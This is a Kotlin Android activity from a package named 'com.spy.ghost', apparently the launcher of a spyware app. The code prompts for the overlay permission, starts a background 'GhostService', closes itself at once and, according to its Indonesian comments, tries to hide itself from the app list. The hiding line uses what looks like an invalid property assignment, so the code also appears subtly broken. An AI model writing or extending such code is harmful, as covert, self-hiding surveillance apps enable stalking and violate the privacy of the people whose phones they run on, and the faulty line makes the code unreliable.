package com.spy.ghost

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Cek jika permission Display over other apps belum diberikan
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
            startActivity(intent)
        }

        startService()
        finish() // Langsung tutup diri sendiri
        
        // Sembunyikan diri dari list aplikasi
        componentEnabledSetting = android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }

    private fun startService() {
        val intent = Intent(this, GhostService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}